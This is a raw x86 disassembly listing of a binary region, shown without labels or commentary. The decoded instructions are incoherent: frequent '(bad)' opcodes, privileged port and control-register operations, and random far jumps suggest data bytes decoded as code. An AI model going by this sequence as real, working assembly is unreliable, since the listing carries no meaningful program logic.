  40825a:	in     al,0xbf
  40825c:	mov    esp,0x41d59f43
  408261:	es push ds
  408263:	sub    DWORD PTR [ecx+ebp*2],edi
  408266:	cmp    BYTE PTR [ecx],ch
  408268:	push   esp
  408269:	and    BYTE PTR [esp+eiz*2+0xa],0xb0
  40826e:	imul   ebx,DWORD PTR [edi+0x4f924129],0x72
  408275:	sbb    bl,dl
  408277:	xor    dl,BYTE PTR [eax-0x25]
  40827a:	adc    edx,esi
  40827c:	(bad)  
  40827d:	(bad)  
  40827e:	adc    edx,DWORD PTR [edi-0x65]
  408281:	js     0x408228
  408283:	xchg   edi,ebp
  408285:	jmp    0x971c:0x66f03707
  40828c:	gs inc esp
  40828e:	nop
  40828f:	and    al,0x61
  408291:	and    dh,bl
  408293:	pushf  
  408294:	jne    0x4082db
  408296:	mov    ch,BYTE PTR [esi-0x6bfca543]
  40829c:	mov    ebp,0xb5f3804c
  4082a1:	pushf  
  4082a2:	lahf   
  4082a3:	pop    ecx
  4082a4:	pop    DWORD PTR [edx]
  4082a6:	pop    esp
  4082a7:	outs   dx,DWORD PTR ds:[esi]
  4082a8:	inc    ecx
  4082a9:	or     ebx,DWORD PTR [eax+0x7d302344]
  4082af:	arpl   WORD PTR [eax+0x41],sp
  4082b2:	add    eax,0xb9530cd2
  4082b7:	and    BYTE PTR [edx-0x65f42ef8],cl
  4082bd:	test   al,0x5b
  4082bf:	nop
  4082c0:	adc    al,0x31
  4082c2:	test   al,0xf8
  4082c4:	(bad)
  4082c8:	repz lock retf 0x8c9
  4082cd:	jae    0x408342
  4082cf:	icebp  
  4082d0:	mov    ch,0x18
  4082d2:	push   edx
  4082d3:	ins    BYTE PTR es:[edi],dx
  4082d4:	shl    DWORD PTR [esi],0xd1
  4082d7:	inc    esi
  4082d8:	sbb    eax,DWORD PTR [eax+0x7f083a76]
  4082de:	(bad)
  4082e2:	retf   0xb8ec
  4082e5:	add    DWORD PTR [esi+0x5e],0xbaf79d70
  4082ec:	xor    ah,BYTE PTR [ecx-0x4b]
  4082ef:	jle    0x4082df
  4082f1:	or     ebp,eax
  4082f3:	sbb    esp,DWORD PTR [ebp-0xe]
  4082f6:	push   edi
  4082f7:	xchg   esp,eax
  4082f8:	adc    bl,BYTE PTR [edi+0xcf057d6]
  4082fe:	adc    dh,BYTE PTR [ecx+0x4]
  408301:	daa    
  408302:	jmp    0xd1dfb7a
  408307:	scas   eax,DWORD PTR es:[edi]
  408308:	clc    
  408309:	sub    ecx,DWORD PTR [esi]
  40830b:	dec    esi
  40830c:	mov    dl,BYTE PTR [edx+0x12e4ea27]
  408312:	pop    ebx
  408313:	add    DWORD PTR [ecx+0x24],ebx
  408316:	fs daa 
  408318:	adc    BYTE PTR [ecx],cl
  40831a:	inc    eax
  40831b:	mov    DWORD PTR [edx-0x44271319],esi
  408321:	sbb    DWORD PTR [eax+0x3518264f],ebx
  408327:	pop    ss
  408328:	call   0x561a:0xc94382e6
  40832f:	stc    
  408330:	test   eax,0xcd887689
  408335:	psubsb mm2,QWORD PTR [ebx-0x30]
  408339:	retf   
  40833a:	fcomp  DWORD PTR [eax]
  40833c:	in     al,dx
  40833d:	mov    edi,0x5f4679ba
  408342:	cs pop edx
  408344:	jo     0x408309
  408346:	mov    bl,0x98
  408348:	and    DWORD PTR [ecx],ecx
  40834a:	(bad)  
  40834b:	fdivr  st(5),st
  40834d:	retf   0x9ac2
  408350:	adc    al,0xf5
  408352:	xchg   ecx,eax
  408353:	dec    ecx
  408354:	(bad)  
  408355:	and    DWORD PTR [edi+0x45],edi
  408358:	adc    esp,DWORD PTR [eax-0x11]
  40835b:	xchg   esp,eax
  40835c:	xor    eax,0x929e61b
  408361:	mov    al,0x31
  408363:	leave  
  408364:	push   eax
  408365:	fdiv   st,st(3)
  408367:	inc    ebx
  408368:	push   ecx
  408369:	mov    dl,0xd9
  40836b:	jno    0x40832c
  40836d:	push   edi
  40836e:	loope  0x4083e7
  408370:	cmc    
  408371:	aad    0xf2
  408373:	aam    0x91
  408375:	jle    0x4083aa
  408377:	mov    dh,0xe7
  408379:	add    esi,DWORD PTR ds:0x48fc59f9
  40837f:	stc    
  408380:	fnstcw WORD PTR [edx]
  408382:	lea    esi,[esi-0x5dd6fbe3]
  408388:	and    eax,0xd90a9d77
  40838d:	addr16 enter 0x4834,0x73
  408392:	and    DWORD PTR [ebx],0xfffffff9
  408395:	sub    BYTE PTR [ebx+0x69d08e2],bl
  40839b:	mov    ecx,0xfe13d333
  4083a0:	int    0x2a
  4083a2:	dec    edx
  4083a3:	pop    ebp
  4083a4:	add    DWORD PTR [ecx],0xffffff9d
  4083a7:	xor    BYTE PTR [edx-0x68],bl
  4083aa:	push   ebx
  4083ab:	out    0xd3,al
  4083ad:	outs   dx,BYTE PTR ds:[esi]
  4083ae:	(bad)  
  4083af:	xlat   BYTE PTR ds:[ebx]
  4083b0:	add    ecx,DWORD PTR [esi+0x68]
  4083b3:	std    
  4083b4:	outs   dx,DWORD PTR ds:[esi]
  4083b5:	(bad)  
  4083b6:	cmc    
  4083b7:	jns    0x4083c5
  4083b9:	xchg   edi,eax
  4083ba:	sub    dh,BYTE PTR [edx-0x71959e5c]
  4083c0:	pushf  
  4083c1:	retf   
  4083c2:	jns    0x40835f
  4083c4:	inc    ebx
  4083c5:	or     bl,BYTE PTR [edx]
  4083c7:	dec    esp
  4083c8:	icebp  
  4083c9:	fstp   DWORD PTR [eax+edi*4]
  4083cc:	(bad)  
  4083cd:	cs jmp 0x408365
  4083d0:	jae    0x4083e1
  4083d2:	fbstp  TBYTE PTR [eax+ebx*8+0x48]
  4083d6:	dec    edi
  4083d7:	cdq    
  4083d8:	add    edi,eax
  4083da:	jno    0x408445
  4083dc:	hlt    
  4083dd:	and    bl,BYTE PTR [edx+0x66bf4994]
  4083e3:	out    dx,al
  4083e4:	ret    0x6515
  4083e7:	push   edx
  4083e8:	ds popf 
  4083ea:	xor    bl,bh
  4083ec:	mov    ds:0xd6ff2a99,eax
  4083f1:	(bad)  
  4083f3:	jl     0x408429
  4083f5:	imul   ebx,DWORD PTR [eax-0x6edfc56f],0xffffff83
  4083fc:	outs   dx,DWORD PTR ds:[esi]
  4083fd:	fsub   QWORD PTR [esi]
  4083ff:	push   ebx
  408400:	cmp    al,0x4a
  408402:	mov    bl,0x98
  408404:	sbb    al,BYTE PTR [ecx]
  408406:	push   ecx
  408407:	xor    al,0x5
  408409:	gs push 0xffffffc1
  40840c:	xor    edi,edi
  40840e:	call   0xcd6e:0xfd785d2a
  408415:	add    BYTE PTR ds:0x262535,0x13
  40841c:	loop   0x4083b2
  40841e:	je     0x408434
  408420:	or     BYTE PTR [eax],bh
  408422:	out    dx,al
  408423:	sbb    ebx,DWORD PTR [edi+0x35dcf68b]
  408429:	mov    cl,0xdf
  40842b:	push   0x58
  40842d:	dec    esp
  40842e:	test   BYTE PTR [edi+0x60],bl
  408431:	push   ds
  408432:	(bad)  
  408433:	mov    edx,0x4bbc0da3
  408438:	adc    DWORD PTR [esi+0x278c4c30],ebx
  40843e:	clc    
  40843f:	sti    
  408440:	mov    esp,0xf654b7b4
  408445:	(bad)  
  408446:	jae    0x4083f0
  408448:	mov    edi,0xccb92246
  40844d:	cli    
  40844e:	xchg   esi,eax
  40844f:	movups XMMWORD PTR [edx+0x337dfe04],xmm5
  408456:	in     eax,dx
  408457:	jmp    0x40845c
  408459:	xlat   BYTE PTR ds:[ebx]
  40845a:	xchg   edx,eax
  40845b:	and    al,0xd7
  40845d:	xor    cl,bh
  40845f:	(bad)
  408463:	popf   
  408464:	push   esi
  408465:	shl    DWORD PTR [ebp-0x5b099ad8],0xae
  40846c:	push   ecx
  40846d:	sbb    eax,0x3f195ad9
  408472:	(bad)  
  408473:	addr16 sti 
  408475:	mov    dh,0x27
  408477:	cmp    al,0x53
  408479:	mov    al,ds:0x7bd83936
  40847e:	cmp    ch,bh
  408480:	dec    esp
  408481:	sbb    al,0x81
  408483:	mov    eax,0x2226787e
  408488:	push   edi
  408489:	test   BYTE PTR [eax-0x5a95a01d],0x58
  408490:	and    bl,BYTE PTR [edi-0x25]
  408493:	cmp    al,0xd4
  408495:	mov    edx,gs
  408497:	mov    bl,0xb
  408499:	(bad)  
  40849a:	fild   WORD PTR [edx-0x1a10f1e1]
  4084a0:	adc    cl,BYTE PTR [ebx]
  4084a2:	sar    edi,0x9a
  4084a5:	and    al,0x38
  4084a7:	sub    esp,0x3a
  4084aa:	jne    0x4084c9
  4084ac:	arpl   WORD PTR [eax+0x46],di
  4084af:	into   
  4084b0:	mov    ecx,0x398b2e85
  4084b5:	sahf   
  4084b6:	push   ecx
  4084b7:	sub    edx,DWORD PTR [ebx+0x6139f419]
  4084bd:	or     al,BYTE PTR [esi]
  4084bf:	lods   eax,DWORD PTR ds:[esi]
  4084c0:	sub    BYTE PTR [esi-0x41],0x6f
  4084c4:	push   eax
  4084c5:	mov    al,0xce
  4084c7:	dec    edi
  4084c8:	dec    ebp
  4084c9:	retf   
  4084ca:	jg     0x40844e
  4084cc:	mov    esi,0xafc71d2c
  4084d1:	imul   ecx,DWORD PTR [esi+0x49],0x245b6ca0
  4084d8:	push   es
  4084d9:	xlat   BYTE PTR ds:[ebx]
  4084da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4084db:	not    DWORD PTR [edi+0x28078d4c]
  4084e1:	sbb    eax,0xf78b622
  4084e6:	mov    BYTE PTR [ebx],al
  4084e8:	int3   
  4084e9:	xchg   dh,dl
  4084eb:	sbb    ebx,DWORD PTR ds:0x96e4f9ab
  4084f1:	push   0x2
  4084f3:	fwait
  4084f4:	outs   dx,DWORD PTR ds:[esi]
  4084f5:	push   eax
  4084f6:	jmp    0x40850d
  4084f8:	adc    edx,edi
  4084fa:	mov    dl,0x7d
  4084fc:	int3   
  4084fd:	jecxz  0x4084f0
  4084ff:	mov    WORD PTR [eax],es
  408501:	hlt    
  408502:	jecxz  0x4084b6
  408504:	mov    esi,0x1ea88aa9
  408509:	or     ah,0x11
  40850c:	xchg   DWORD PTR [ecx],ebp
  40850e:	into   
  40850f:	je     0x4084d4
  408511:	cmc    
  408512:	mov    ?,eax
  408514:	xor    al,0xb6
  408516:	pop    ebp
  408517:	adc    dl,BYTE PTR [edx-0x3b]
  40851a:	cmp    DWORD PTR [eax+0x65],0x1e
  40851e:	ficom  DWORD PTR [edx]
  408520:	hlt    
  408521:	outs   dx,DWORD PTR ds:[esi]
  408522:	ror    BYTE PTR [esi+edi*8+0x73f8bee7],0xe9
  40852a:	jecxz  0x4084cb
  40852c:	add    ebx,eax
  40852e:	stos   BYTE PTR es:[edi],al
  40852f:	(bad)  
  408531:	pop    es
  408532:	out    0xbb,eax
  408534:	dec    edx
  408535:	jmp    0x4085b2
  408537:	jmp    0xf30a687a
  40853c:	popf   
  40853d:	xchg   ebx,eax
  40853e:	sbb    DWORD PTR [esi+0x646aade9],esp
  408544:	push   edx
  408545:	lods   eax,DWORD PTR ds:[esi]
  408546:	clc    
  408547:	stos   BYTE PTR es:[edi],al
  408548:	in     al,0xcd
  40854a:	pop    ebp
  40854b:	stc    
  40854c:	leave  
  40854d:	sbb    eax,0x3adb0ddb
  408552:	or     eax,0xb3b437e1
  408557:	inc    esp
  408558:	mov    edx,0x8fcd40c3
  40855d:	cwde   
  40855e:	ror    DWORD PTR [esi-0x1f9ef640],1
  408564:	push   edi
  408565:	push   ss
  408566:	jge    0x40850a
  408568:	cmp    edx,DWORD PTR [eax-0x295253cc]
  40856e:	mov    eax,ds:0x6dcf3097
  408573:	leave  
  408574:	popa   
  408575:	push   esp
  408576:	or     eax,0x5c334af2
  40857b:	jl     0x4085da
  40857d:	aam    0xea
  40857f:	mov    dh,0xab
  408581:	adc    ebp,DWORD PTR [ebx+edi*1]
  408584:	pop    ebx
  408585:	pop    edi
  408586:	mov    al,0xff
  408588:	daa    
  408589:	test   BYTE PTR ss:[edx+0x8],0x3f
  40858e:	sbb    DWORD PTR [eax+0x5],eax
  408591:	mov    edi,0xc9708a89
  408596:	into   
  408597:	popf   
  408598:	cmp    eax,0x8a831472
  40859d:	(bad)  
  40859e:	icebp  
  40859f:	mov    bh,0xab
  4085a1:	scas   eax,DWORD PTR es:[edi]
  4085a2:	mov    edx,0x2e6e25b4
  4085a7:	push   ebp
  4085a8:	scas   eax,DWORD PTR es:[edi]
  4085a9:	or     DWORD PTR [ecx-0x4f7d5ffa],esp
  4085af:	enter  0x15fb,0x5a
  4085b3:	enter  0xfba7,0x7
  4085b7:	sbb    al,0xf4
  4085b9:	dec    esi
  4085ba:	sti    
  4085bb:	mov    ecx,0x2f7a288f
  4085c0:	inc    esp
  4085c1:	or     eax,0xc6511c5c
  4085c6:	in     al,dx
  4085c7:	out    0xef,eax
  4085c9:	xor    esi,ebp
  4085cb:	js     0x40864b
  4085cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4085ce:	popf   
  4085cf:	repnz push ebx
  4085d1:	ja     0x4085d4
  4085d3:	frstor [ecx-0x5d]
  4085d6:	pop    DWORD PTR [esp+ebx*2]
  4085d9:	cld    
  4085da:	imul   DWORD PTR [ebx+0xf54a911]
  4085e0:	push   es
  4085e1:	push   edi
  4085e2:	(bad)  
  4085e3:	(bad)  
  4085e4:	out    dx,al
  4085e5:	(bad)  
  4085e6:	shr    DWORD PTR [edx+eiz*2-0x5c],cl
  4085ea:	out    0x6e,al
  4085ec:	ins    DWORD PTR es:[edi],dx
  4085ed:	push   ecx
  4085ee:	mov    eax,0x942382d2
  4085f3:	adc    BYTE PTR [edi-0x638ae0de],ah
  4085f9:	sub    ecx,ecx
  4085fb:	mov    eax,0x2525e091
  408600:	pop    ebp
  408601:	add    eax,0xc424959
  408606:	test   al,0x60
  408608:	sbb    eax,0x628bf132
  40860d:	or     eax,0xfeb8ba7c
  408612:	pop    DWORD PTR [eax]
  408614:	ds push esp
  408616:	jge    0x40861c
  408618:	add    DWORD PTR [ebp+ecx*8-0x60],edi
  40861c:	addr16 int 0xba
  40861f:	push   0x50f7825f
  408624:	mov    bh,0xaa
  408626:	pusha  
  408627:	adc    al,0xb0
  408629:	sbb    al,0xe2
  40862b:	xchg   edx,edi
  40862d:	mov    ebp,0x873731ed
  408632:	in     al,dx
  408633:	push   ebp
  408634:	mov    ecx,0x34e70a1a
  408639:	stc    
  40863a:	push   ss
  40863b:	mov    WORD PTR [edx+0x29],ds
  40863e:	xor    eax,0x6023ab6
  408643:	or     BYTE PTR [esi],ah
  408645:	and    DWORD PTR [esi],0x2a59ea6d
  40864b:	xchg   edx,eax
  40864c:	xchg   ebp,eax
  40864d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40864e:	(bad)  [ebp+0x3e8b5a7]
  408654:	shl    DWORD PTR [ebx-0x25497c9c],0x3
  40865b:	pop    esp
  40865c:	xchg   edi,eax
  40865d:	xor    ah,bh
  40865f:	or     eax,0x1bbf3a3c
  408664:	test   DWORD PTR [esi+0x7e],edx
  408667:	push   es
  408668:	call   0xccd35ae8
  40866d:	mov    eax,0x5b55b8ae
  408672:	loope  0x40866c
  408674:	xchg   esp,eax
  408675:	cs jecxz 0x408657
  408678:	or     al,BYTE PTR [edi+0x3148490b]
  40867e:	push   ecx
  40867f:	cwde   
  408680:	out    0xf4,eax
  408682:	rol    BYTE PTR [ebp-0x5208b924],cl
  408688:	retf   0x5723
  40868b:	adc    DWORD PTR [ecx+eiz*4],edi
  40868e:	pop    esp
  40868f:	fadd   DWORD PTR [edx+0xe]
  408692:	push   ss
  408693:	mov    esi,0xcde6dc99
  408698:	cld    
  408699:	pushf  
  40869a:	mov    eax,ds:0xb4838a91
  40869f:	lods   al,BYTE PTR ds:[esi]
  4086a0:	out    dx,al
  4086a1:	sbb    eax,0x7ac01ebc
  4086a6:	and    eax,0xae58357
  4086ab:	ins    DWORD PTR es:[edi],dx
  4086ac:	fcomp  st(1)
  4086ae:	stc    
  4086af:	sub    BYTE PTR [ebp+0x2e020857],al
  4086b5:	pop    esi
  4086b6:	into   
  4086b7:	add    eax,0x72b79b91
  4086bc:	pop    edx
  4086bd:	jmp    0x6106:0x22f0531a
  4086c4:	lds    ecx,FWORD PTR [eax+0xe4481de]
  4086ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086cb:	aaa    
  4086cc:	jmp    0x408725
  4086ce:	addr16 pop ebx
  4086d0:	out    dx,eax
  4086d1:	mov    esp,ebp
  4086d3:	and    eax,DWORD PTR [ecx+0x1a]
  4086d6:	ins    BYTE PTR es:[edi],dx
  4086d7:	test   cl,dl
  4086d9:	mov    WORD PTR [edi+edi*1],ss
  4086dc:	addr16 hlt 
  4086de:	imul   esi,ebp,0x470ede67
  4086e4:	push   edx
  4086e5:	add    al,0xf9
  4086e7:	jle    0x4086b8
  4086e9:	pushf  
  4086ea:	int    0xf4
  4086ec:	xchg   DWORD PTR [esi-0xf],edi
  4086ef:	shl    bh,cl
  4086f1:	paddd  mm5,QWORD PTR [ecx-0x55]
  4086f5:	dec    ebp
  4086f6:	xor    DWORD PTR [ebx-0x4d6c1919],0x6512f546
  408700:	pop    esp
  408701:	push   edx
  408702:	mov    esi,0xcd0ab756
  408707:	in     eax,dx
  408708:	clc    
  408709:	push   0x51db848
  40870e:	xchg   esp,eax
  40870f:	fst    QWORD PTR [ebx+0x78]
  408712:	test   DWORD PTR [edx-0x6303bd8a],edi
  408718:	cmp    al,0xe9
  40871a:	mov    ecx,0x593e69f9
  40871f:	jb     0x4086ab
  408721:	adc    DWORD PTR ds:0xd2c7a17e,esi
  408727:	add    esi,esi
  408729:	mov    esi,0xb79baa65
  40872f:	push   ebx
  408730:	mov    al,0xd3
  408732:	xor    al,BYTE PTR [ebp+0x14]
  408735:	dec    edx
  408736:	loope  0x4086dc
  408738:	mov    bh,0x77
  40873a:	adc    DWORD PTR [ebp-0x2d309fed],esp
  408740:	mov    al,0x26
  408742:	cmp    esi,DWORD PTR [edi+eiz*4-0xdd675]
  408749:	call   0x4dd19fe8
  40874e:	int3   
  40874f:	inc    edi
  408750:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408751:	cmp    BYTE PTR [edi],bl
  408753:	ret    
  408754:	xor    cl,BYTE PTR [edi+ecx*8+0x236eb884]
  40875b:	or     dh,BYTE PTR [edi+0x15f17979]
  408761:	sub    eax,0xe2bd88eb
  408766:	inc    esp
  408767:	mov    bl,0x7e
  408769:	cmp    BYTE PTR [esi],bh
  40876b:	or     BYTE PTR [esi-0x1802cf57],dh
  408771:	xchg   DWORD PTR [edx+0x1e],ebp
  408774:	out    dx,al
  408775:	in     eax,dx
  408776:	push   ecx
  408777:	jmp    0x220db0fc
  40877c:	xchg   edx,eax
  40877d:	inc    ebx
  40877e:	pusha  
  40877f:	inc    esp
  408780:	mov    al,ds:0x7b51bd97
  408785:	sub    DWORD PTR [ebp-0x5],ecx
  408788:	(bad)  
  408789:	hlt    
  40878a:	fidiv  WORD PTR [edi-0x7b]
  40878d:	ins    DWORD PTR es:[edi],dx
  40878e:	and    edi,DWORD PTR [esi-0x6c]
  408791:	jp     0x40872d
  408793:	adc    eax,DWORD PTR [ebp-0x6c50e1b3]
  408799:	loopne 0x408801
  40879b:	ja     0x408750
  40879d:	test   DWORD PTR es:[edi],edx
  4087a0:	cmp    DWORD PTR [esi],ecx
  4087a2:	fdivr  DWORD PTR [ebx-0x57]
  4087a5:	fist   WORD PTR [ecx-0x18]
  4087a8:	xchg   DWORD PTR [ebp-0x6fe19e94],edx
  4087ae:	pop    ss
  4087af:	push   edi
  4087b0:	cmp    al,BYTE PTR [edx-0x25]
  4087b3:	sbb    edx,esp
  4087b5:	mov    edi,cr7
  4087b8:	int3   
  4087b9:	pop    ebx
  4087ba:	adc    esp,edi
  4087bc:	push   0x2f
  4087be:	mov    dh,0xec
  4087c0:	xchg   DWORD PTR [ecx],ebp
  4087c2:	cmp    DWORD PTR [ebx+0x54],0x9169cc89
  4087c9:	ins    BYTE PTR es:[edi],dx
  4087ca:	xchg   esi,eax
  4087cb:	arpl   ax,dx
  4087cd:	lods   eax,DWORD PTR ds:[esi]
  4087ce:	mov    ds:0x92df1f99,eax
  4087d3:	or     DWORD PTR [edx+0x3ae58351],0x9ef03b0b
  4087dd:	mov    cl,0xbd
  4087df:	aam    0x3c
  4087e1:	test   al,0xcb
  4087e3:	mov    al,0x79
  4087e5:	jno    0x4087a9
  4087e7:	mov    al,0x5a
  4087e9:	dec    bl
  4087eb:	cs push edi
  4087ed:	stos   DWORD PTR es:[edi],eax
  4087ee:	arpl   WORD PTR [edi],bx
  4087f0:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  4087f2:	dec    eax
  4087f3:	ds xchg esp,eax
  4087f5:	mov    bh,bh
  4087f7:	fild   DWORD PTR [esi-0x7b3f74f3]
  4087fd:	cld    
  4087fe:	sbb    eax,DWORD PTR [ecx]
  408800:	mov    bl,0x32
  408802:	or     ebx,DWORD PTR [ebx+0x6fd9b5bc]
  408808:	loopne 0x408881
  40880a:	jne    0x4087df
  40880c:	leave  
  40880d:	jmp    0x4087e8
  40880f:	sub    al,0xf
  408811:	mov    ch,BYTE PTR [eax]
  408813:	pop    eax
  408814:	jno    0x408812
  408816:	aad    0xda
  408818:	inc    ecx
  408819:	stos   BYTE PTR es:[edi],al
  40881a:	sti    
  40881b:	(bad)  [ebx+0x6c]
  40881e:	dec    esi
  40881f:	comiss xmm5,DWORD PTR [eax-0x2985b599]
  408826:	(bad)  
  408827:	out    dx,eax
  408828:	jo     0x408897
  40882a:	ja     0x408835
  40882c:	out    0xbd,al
  40882e:	mov    ebx,0x2a9b6dab
  408833:	xchg   ecx,eax
  408834:	ins    DWORD PTR es:[edi],dx
  408835:	lahf   
  408836:	xchg   ebx,eax
  408837:	jecxz  0x40887f
  408839:	loope  0x4087f5
  40883b:	cld    
  40883c:	sub    ah,cl
  40883e:	cmc    
  40883f:	sub    bl,BYTE PTR [edi]
  408841:	push   ebx
  408842:	inc    esi
  408843:	sbb    ch,cl
  408845:	cld    
  408846:	loopne 0x408824
  408848:	sbb    al,0x5c
  40884a:	scas   al,BYTE PTR es:[edi]
  40884b:	and    DWORD PTR [ebx+esi*2+0x3ff10b22],esp
  408852:	mov    WORD PTR [eax],fs
  408854:	int    0x1a
  408856:	jp     0x408859
  408858:	bound  ebp,QWORD PTR [edx-0x65786682]
  40885e:	jle    0x4087fa
  408860:	out    0x6f,al
  408862:	inc    ebp
  408863:	fldenv [ebp+0x3794cc21]
  408869:	arpl   WORD PTR [edx+0x49c81a38],dx
  40886f:	inc    edx
  408870:	dec    edi
  408871:	dec    esp
  408872:	arpl   WORD PTR [eax],bp
  408874:	cmp    eax,0x7f67d0dd
  408879:	pop    ebx
  40887a:	dec    edi
  40887b:	call   DWORD PTR [edx-0x5ac0ccec]
  408881:	or     eax,0x1c2b950f
  408886:	sub    DWORD PTR [esi-0x14],ebx
  408889:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40888a:	out    0xcb,eax
  40888c:	adc    al,0xa9
  40888e:	addr16 pusha 
  408890:	pop    ebx
  408891:	(bad)  
  408892:	sbb    edx,DWORD PTR [edx]
  408894:	fnstenv [esi+0x67614173]
  40889a:	cmp    ecx,ebp
  40889c:	sbb    esi,edx
  40889e:	fs out dx,eax
  4088a0:	outs   dx,WORD PTR ds:[esi]
  4088a2:	jb     0x408878
  4088a4:	sub    al,0x6c
  4088a6:	pop    ss
  4088a7:	or     eax,0x414af0a1
  4088ac:	ficomp DWORD PTR [eax+0x1f]
  4088af:	fsub   DWORD PTR [esi-0x47]
  4088b2:	xchg   bh,bl
  4088b4:	add    eax,0x66bf5178
  4088b9:	push   ecx
  4088ba:	fimul  WORD PTR [ebx+0x2b4e6f00]
  4088c0:	add    al,0x52
  4088c2:	mov    WORD PTR [edx],es
  4088c4:	adc    al,0xda
  4088c6:	(bad)  
  4088c8:	in     eax,0x33
  4088ca:	iret   
  4088cb:	dec    ecx
  4088cc:	fstp   TBYTE PTR [edx]
  4088ce:	mov    bh,0x34
  4088d0:	xchg   ebp,eax
  4088d1:	dec    edx
  4088d2:	nop
  4088d3:	cmp    al,0x66
  4088d5:	aam    0xaf
  4088d7:	xor    ch,BYTE PTR [edx]
  4088d9:	cmp    BYTE PTR [edx],ch
  4088db:	xchg   ebx,eax
  4088dc:	inc    edx
  4088dd:	mov    dh,0xb
  4088df:	jmp    0xb3e5:0x7703735e
  4088e6:	add    BYTE PTR [edx-0x1e],dl
  4088e9:	push   es
  4088ea:	cwde   
  4088eb:	mov    dh,0x7d
  4088ed:	inc    edx
  4088ee:	imul   ebp,ecx,0x4a105fa2
  4088f4:	mov    esi,0xce3cec04
  4088f9:	push   eax
  4088fa:	pushf  
  4088fb:	adc    eax,0xfb456fb0
  408900:	dec    edx
  408901:	scas   eax,DWORD PTR es:[edi]
  408902:	dec    edx
  408903:	fstp   TBYTE PTR [edx-0x16]
  408906:	loope  0x40891f
  408908:	xchg   esi,eax
  408909:	mov    ah,0x8e
  40890b:	gs mov dl,0x8e
  40890e:	test   eax,0xd201d8b1
  408913:	mov    ch,ch
  408915:	dec    esi
  408916:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408917:	jg     0x408975
  408919:	and    BYTE PTR [esi+0x4344c2dd],dh
  40891f:	adc    al,0xc
  408921:	test   DWORD PTR [ebx],edi
  408923:	cs sub al,0x59
  408926:	mov    ecx,0x3e69a9b3
  40892b:	es push ecx
  40892d:	inc    ecx
  40892e:	arpl   WORD PTR [eax+edx*1-0x42a050b5],di
  408935:	aaa    
  408936:	rep lods al,BYTE PTR ds:[esi]
  408938:	in     eax,0xe1
  40893a:	cmp    bl,BYTE PTR [ebp+0x257a8356]
  408940:	and    bl,cl
  408942:	lock or ebx,DWORD PTR [ecx]
  408945:	ins    DWORD PTR es:[edi],dx
  408946:	xchg   esi,eax
  408947:	pop    esp
  408948:	or     al,0xd
  40894a:	in     eax,0xac
  40894c:	icebp  
  40894d:	xchg   DWORD PTR [eax-0x63],esi
  408950:	fs push edx
  408952:	cmp    bl,al
  408954:	sub    BYTE PTR [ecx],ah
  408956:	inc    ebp
  408957:	mov    edi,fs
  408959:	call   0x12e2941a
  40895e:	je     0x408943
  408960:	mov    al,0x34
  408962:	xor    bl,bl
  408964:	ret    
  408965:	adc    ah,BYTE PTR [ebp+0x7529392a]
  40896b:	jns    0x408992
  40896d:	das    
  40896e:	jl     0x40899b
  408970:	push   cs
  408971:	jo     0x40897b
  408973:	jmp    0xb634:0xed3317b0
  40897a:	mov    ds:0xb99bb922,eax
  40897f:	adc    DWORD PTR [esi],eax
  408981:	add    esi,DWORD PTR [ecx-0x17]
  408984:	fsubr  DWORD PTR [ecx+ebx*2+0x5d]
  408988:	jb     0x4089e5
  40898a:	imul   edi,DWORD PTR [ebx-0x54a8b574],0x20
  408991:	int    0xa9
  408993:	mov    ch,0x9f
  408995:	imul   ecx,DWORD PTR [edi-0xb],0x722a1519
  40899c:	int3   
  40899d:	cld    
  40899e:	and    WORD PTR [esi-0x5f6dab55],sp
  4089a5:	inc    esi
  4089a6:	mov    eax,ds:0x65c16b51
  4089ab:	or     ebp,ebp
  4089ad:	cmp    edi,edi
  4089af:	or     ecx,DWORD PTR [edx+0x36]
  4089b2:	stos   BYTE PTR es:[edi],al
  4089b3:	push   ebx
  4089b4:	outs   dx,BYTE PTR ds:[esi]
  4089b5:	mov    eax,ds:0x7c587c7f
  4089ba:	mov    al,0x64
  4089bc:	xor    ah,cl
  4089be:	push   ecx
  4089bf:	mov    ecx,0x9f30f5b9
  4089c4:	aam    0x9c
  4089c6:	(bad)  
  4089c7:	repz rcl DWORD PTR [ecx+ebp*8],1
  4089cb:	jg     0x4089f9
  4089cd:	cwde   
  4089ce:	lea    edi,[ebx]
  4089d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4089d1:	mov    ds:0xc4ecb54c,al
  4089d6:	push   ds
  4089d7:	fcom   DWORD PTR [eax]
  4089d9:	inc    edx
  4089da:	pusha  
  4089db:	adc    al,0x29
  4089dd:	shrd   DWORD PTR [ebx+eax*2-0x38],esi,0x6e
  4089e3:	icebp  
  4089e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4089e5:	xor    dl,BYTE PTR [edx]
  4089e7:	es push ecx
  4089e9:	neg    ebx
  4089eb:	cmc    
  4089ec:	leave  
  4089ed:	outs   dx,BYTE PTR ds:[esi]
  4089ee:	adc    al,0xcc
  4089f0:	aaa    
  4089f1:	stos   BYTE PTR es:[edi],al
  4089f2:	cwde   
  4089f3:	push   esp
  4089f4:	mov    esp,0xda729a19
  4089f9:	sub    eax,0x3d701af0
  4089fe:	ja     0x4089d8
  408a00:	pop    es
  408a01:	push   ebp
  408a02:	xchg   ecx,eax
  408a03:	adc    edx,DWORD PTR [ecx+0x1e8593f0]
  408a09:	ss sbb eax,0x7cbba845
  408a0f:	xor    BYTE PTR [ecx],ah
  408a11:	pop    ds
  408a12:	dec    ecx
  408a13:	fimul  WORD PTR [edx-0x7fc5504c]
  408a19:	mov    bh,0x4b
  408a1b:	and    eax,DWORD PTR [edx+0x47]
  408a1e:	dec    ebx
  408a1f:	inc    edx
  408a20:	mov    ss:0xd1683a8,al
  408a26:	retf   0x9388
  408a29:	xchg   edi,eax
  408a2a:	pop    esp
  408a2b:	cmp    ecx,DWORD PTR [edi+0x2e]
  408a2e:	pop    ss
  408a2f:	daa    
  408a30:	push   edx
  408a31:	xlat   BYTE PTR ds:[ebx]
  408a32:	out    dx,al
  408a33:	jns    0x408ab0
  408a35:	pop    esi
  408a36:	cwde   
  408a37:	ss mov cl,0xb5
